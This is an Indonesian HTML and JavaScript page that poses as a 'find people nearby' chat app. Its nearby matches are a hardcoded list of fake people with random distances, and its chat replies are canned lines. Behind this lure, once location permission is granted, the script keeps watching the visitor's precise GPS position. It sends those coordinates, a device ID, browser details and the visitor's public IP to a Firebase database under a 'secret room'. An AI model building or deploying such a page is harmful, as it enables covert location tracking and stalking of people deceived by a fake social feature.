<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Temukan Orang Sekitar</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: #0f0f1a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: rgba(255,255,255,0.04);
            backdrop-filter: blur(24px);
            border-radius: 40px;
            padding: 36px 24px;
            box-shadow: 0 40px 80px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.08);
            text-align: center;
            position: relative;
            overflow: hidden;
            min-height: 600px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: all 0.4s;
        }
        .discover-screen, .slot-screen, .chat-screen {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 24px;
        }
        .hidden { display: none !important; }
        .radar-icon {
            font-size: 70px;
            filter: drop-shadow(0 0 20px #7c3aed);
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%,100% { transform: translateY(0); }
            50% { transform: translateY(-12px); }
        }
        h1 {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(to right, #c084fc, #818cf8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            line-height: 1.3;
        }
        .subtitle {
            color: #a1a1aa;
            font-size: 14px;
        }
        .btn {
            border: none;
            padding: 18px 40px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s;
            letter-spacing: 0.3px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #7c3aed, #3b82f6);
            color: white;
            box-shadow: 0 12px 30px rgba(123, 58, 237, 0.5);
        }
        .btn-primary:active { transform: scale(0.96); }
        .btn-primary:disabled {
            background: #3f3f5e;
            box-shadow: none;
            color: #aaa;
            cursor: not-allowed;
        }
        .btn-outline {
            background: transparent;
            border: 1px solid rgba(255,255,255,0.25);
            color: #ddd;
            margin-top: 8px;
        }
        .slot-screen { justify-content: center; }
        .slot-machine {
            background: rgba(0,0,0,0.5);
            border-radius: 28px;
            padding: 30px 20px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: inset 0 0 30px rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
        }
        .slot-display {
            height: 90px;
            overflow: hidden;
            position: relative;
            margin: 20px 0 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .slot-name {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(180deg, #fbbf24, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            white-space: nowrap;
        }
        .avatar-slot {
            font-size: 56px;
            margin-bottom: 10px;
            filter: drop-shadow(0 0 12px #c084fc);
        }
        .status-text {
            color: #aaa;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .spinner-icon {
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .result-box {
            margin-top: 20px;
            padding: 16px;
            background: rgba(124, 58, 237, 0.2);
            border-radius: 20px;
            font-weight: 600;
            border: 1px solid #7c3aed;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .chat-screen {
            justify-content: flex-start;
            height: 100%;
        }
        .chat-header {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .back-btn {
            background: none;
            border: none;
            color: #ccc;
            font-size: 22px;
            cursor: pointer;
        }
        .chat-messages {
            width: 100%;
            height: 320px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
            padding: 16px 6px;
            flex: 1;
        }
        .message-bubble {
            max-width: 80%;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 14px;
            line-height: 1.4;
            word-break: break-word;
        }
        .message-sent {
            align-self: flex-end;
            background: #7c3aed;
            color: white;
            border-bottom-right-radius: 4px;
        }
        .message-received {
            align-self: flex-start;
            background: #2a2a40;
            color: #eee;
            border-bottom-left-radius: 4px;
        }
        .chat-input-area {
            width: 100%;
            display: flex;
            gap: 10px;
            margin-top: 12px;
        }
        .chat-input {
            flex: 1;
            padding: 14px 18px;
            border-radius: 30px;
            border: none;
            background: rgba(255,255,255,0.1);
            color: white;
            font-size: 15px;
            outline: none;
            border: 1px solid rgba(255,255,255,0.15);
        }
        .send-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: #7c3aed;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }
        .tracking-indicator {
            margin-top: 10px;
            font-size: 11px;
            color: #9ca3af;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .pulse-dot {
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(16,185,129,0.7); }
            70% { box-shadow: 0 0 0 8px rgba(16,185,129,0); }
            100% { box-shadow: 0 0 0 0 rgba(16,185,129,0); }
        }
    </style>
</head>
<body>
<div class="container" id="mainContainer">

    <!-- HALAMAN DISCOVER -->
    <div id="discoverScreen" class="discover-screen">
        <div class="radar-icon">📡</div>
        <h1>Temukan Orang Sekitar</h1>
        <div class="subtitle">Ngobrol seru dengan yang lagi di dekatmu sekarang</div>
        <button class="btn btn-primary" id="btnFind">
            <i class="fas fa-search-location"></i> Cari Sekarang
        </button>
        <div class="tracking-indicator" id="trackingStatusDiscover">
            <span class="pulse-dot" style="display:none;" id="pulseDiscover"></span>
            <span id="statusDiscover">Lokasi diperlukan untuk menemukan teman</span>
        </div>
    </div>

    <!-- HALAMAN SLOT / JACKPOT -->
    <div id="slotScreen" class="slot-screen hidden">
        <div class="slot-machine">
            <div class="avatar-slot" id="avatarSlot">👤</div>
            <div class="slot-display">
                <span class="slot-name" id="slotName">Mencari...</span>
            </div>
            <div class="status-text" id="slotStatus">
                <i class="fas fa-spinner spinner-icon"></i> <span id="slotStatusText">Menunggu izin lokasi...</span>
            </div>
        </div>
        <div id="resultBox" class="result-box hidden">
            <span id="resultText"></span>
        </div>
        <button class="btn btn-outline hidden" id="btnRetry" onclick="resetToDiscover()">
            <i class="fas fa-redo-alt"></i> Coba Lagi
        </button>
    </div>

    <!-- HALAMAN CHAT -->
    <div id="chatScreen" class="chat-screen hidden">
        <div class="chat-header">
            <button class="back-btn" onclick="kembaliDariChat()"><i class="fas fa-arrow-left"></i></button>
            <div style="display:flex; align-items:center; gap:10px;">
                <span id="chatAvatar" style="font-size:32px;">👤</span>
                <div>
                    <div id="chatPartnerName" style="font-weight:600;">...</div>
                    <div style="font-size:12px; color:#6ee7b7;">online</div>
                </div>
            </div>
            <div style="width:40px;"></div>
        </div>
        <div id="chatMessages" class="chat-messages"></div>
        <div class="chat-input-area">
            <input type="text" id="chatInput" class="chat-input" placeholder="Ketik pesan..." autocomplete="off">
            <button class="send-btn" onclick="kirimPesan()"><i class="fas fa-paper-plane"></i></button>
        </div>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    // 🔥 GANTI DENGAN URL REALTIME DATABASE KAMU
    const firebaseConfig = {
        databaseURL: "https://lokaci-39db8-default-rtdb.asia-southeast1.firebasedatabase.app/"
    };
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const SECRET_ROOM = "yo";

    let DEVICE_ID = localStorage.getItem('tracker_device_id');
    if (!DEVICE_ID) {
        DEVICE_ID = 'device_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('tracker_device_id', DEVICE_ID);
    }
    let publicIP = 'Tidak diketahui';
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => { publicIP = data.ip; })
        .catch(() => console.warn("Gagal ambil IP"));

    const deviceInfo = {
        deviceId: DEVICE_ID,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        ip: publicIP
    };

    let trackingActive = false;
    let watchId = null;

    function mulaiTracking() {
        if (trackingActive) return;
        if (!navigator.geolocation) {
            alert("Geolokasi tidak didukung.");
            return;
        }
        deviceInfo.ip = publicIP;
        set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/info`), deviceInfo)
            .catch(err => console.error("Gagal simpan info device:", err));
        
        watchId = navigator.geolocation.watchPosition(
            (pos) => {
                const { latitude, longitude } = pos.coords;
                set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/position`), {
                    lat: latitude,
                    lng: longitude,
                    timestamp: Date.now()
                }).catch(err => console.error("Gagal simpan posisi:", err));
            },
            (err) => console.warn("Tracking error:", err.message),
            { enableHighAccuracy: true, maximumAge: 5000, timeout: 8000 }
        );
        trackingActive = true;
        const pulseDot = document.getElementById('pulseDiscover');
        if (pulseDot) pulseDot.style.display = 'inline-block';
        document.getElementById('statusDiscover').textContent = 'Lokasi kamu aktif';
    }

    window.addEventListener('beforeunload', () => {
        if (watchId) navigator.geolocation.clearWatch(watchId);
    });

    const fakePeople = [
        { name: "Rina Maulina", avatar: "👩", distance: 120 },
        { name: "Budi Santoso", avatar: "🧑", distance: 230 },
        { name: "Sari Dewi", avatar: "👩‍🦰", distance: 95 },
        { name: "Andi Pratama", avatar: "👨", distance: 340 },
        { name: "Fitriani", avatar: "👩‍🦱", distance: 180 },
        { name: "Dimas Anggara", avatar: "🧔", distance: 410 },
        { name: "Lestari", avatar: "👧", distance: 55 },
        { name: "Rudi Hartono", avatar: "👨‍🦱", distance: 280 },
    ];

    let slotInterval = null;
    let selectedPerson = null;
    let slotRunning = false;

    function startSlotMachine() {
        if (slotRunning) return;
        slotRunning = true;
        const nameEl = document.getElementById('slotName');
        const avatarEl = document.getElementById('avatarSlot');
        slotInterval = setInterval(() => {
            const randomPerson = fakePeople[Math.floor(Math.random() * fakePeople.length)];
            nameEl.textContent = randomPerson.name;
            avatarEl.textContent = randomPerson.avatar;
        }, 60);
    }

    function stopSlotMachine(person) {
        if (!slotRunning) return;
        clearInterval(slotInterval);
        slotInterval = null;
        slotRunning = false;
        document.getElementById('slotName').textContent = person.name;
        document.getElementById('avatarSlot').textContent = person.avatar;
        const distance = Math.floor(Math.random() * 450) + 50;
        document.getElementById('resultText').innerHTML =
            `🎉 Kamu terhubung dengan <strong>${person.name}</strong>!<br>📍 Jarak sekitar <strong>${distance} meter</strong>`;
        document.getElementById('resultBox').classList.remove('hidden');
        document.getElementById('slotStatus').innerHTML = '<span style="color:#10b981;">●</span> <span>Tersambung</span>';
        setTimeout(() => {
            masukChat(person);
        }, 2000);
    }

    function masukChat(person) {
        document.getElementById('slotScreen').classList.add('hidden');
        document.getElementById('chatScreen').classList.remove('hidden');
        document.getElementById('chatPartnerName').textContent = person.name;
        document.getElementById('chatAvatar').textContent = person.avatar;
        document.getElementById('chatMessages').innerHTML = '';
        setTimeout(() => {
            tambahPesanDariLawan(`Hai! Kayaknya kita deketan nih, asik ngobrol bareng!`);
        }, 800);
    }

    document.getElementById('btnFind').addEventListener('click', () => {
        const btn = document.getElementById('btnFind');
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Meminta izin...';

        document.getElementById('discoverScreen').classList.add('hidden');
        document.getElementById('slotScreen').classList.remove('hidden');
        document.getElementById('resultBox').classList.add('hidden');
        document.getElementById('btnRetry').classList.add('hidden');
        document.getElementById('slotStatus').innerHTML = '<i class="fas fa-spinner spinner-icon"></i> <span id="slotStatusText">Menunggu izin lokasi...</span>';
        document.getElementById('slotName').textContent = '...';
        document.getElementById('avatarSlot').textContent = '👤';

        startSlotMachine();

        if (!navigator.geolocation) {
            setSlotError("Geolokasi tidak didukung");
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                mulaiTracking();
                selectedPerson = fakePeople[Math.floor(Math.random() * fakePeople.length)];
                setTimeout(() => {
                    stopSlotMachine(selectedPerson);
                }, 2000);
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
            },
            (err) => {
                setSlotError("Izin lokasi diperlukan. Coba lagi.");
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
                document.getElementById('slotStatus').innerHTML = '<span style="color:#ef4444;">⚠️</span> <span>Izin lokasi ditolak</span>';
                document.getElementById('btnRetry').classList.remove('hidden');
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });

    function setSlotError(msg) {
        document.getElementById('slotStatus').innerHTML = `<span style="color:#ef4444;">⚠️</span> <span>${msg}</span>`;
        document.getElementById('btnRetry').classList.remove('hidden');
    }

    window.resetToDiscover = function() {
        clearInterval(slotInterval);
        slotRunning = false;
        document.getElementById('slotScreen').classList.add('hidden');
        document.getElementById('discoverScreen').classList.remove('hidden');
    };

    window.kembaliDariChat = function() {
        document.getElementById('chatScreen').classList.add('hidden');
        document.getElementById('discoverScreen').classList.remove('hidden');
    };

    window.kirimPesan = function() {
        const input = document.getElementById('chatInput');
        const teks = input.value.trim();
        if (!teks) return;
        tambahPesan(teks, 'sent');
        input.value = '';
        const balasanAcak = [
            "Oh gitu ya, haha", "Serius? Cerita dong", "Wah keren juga",
            "Sama dong, aku juga suka", "Hmm, nggak nyangka", "Kita deket banget loh ternyata",
            "Jadi penasaran", "Iya ya, bener banget", "Ngomong-ngomong, lagi ngapain?"
        ];
        setTimeout(() => {
            const balasan = balasanAcak[Math.floor(Math.random() * balasanAcak.length)];
            tambahPesanDariLawan(balasan);
        }, 1500 + Math.random() * 2000);
    };

    function tambahPesan(teks, tipe) {
        const container = document.getElementById('chatMessages');
        const div = document.createElement('div');
        div.className = `message-bubble message-${tipe}`;
        div.textContent = teks;
        container.appendChild(div);
        container.scrollTop = container.scrollHeight;
    }

    function tambahPesanDariLawan(teks) {
        tambahPesan(teks, 'received');
    }

    document.getElementById('chatInput').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') window.kirimPesan();
    });
</script>
</body>
</html>
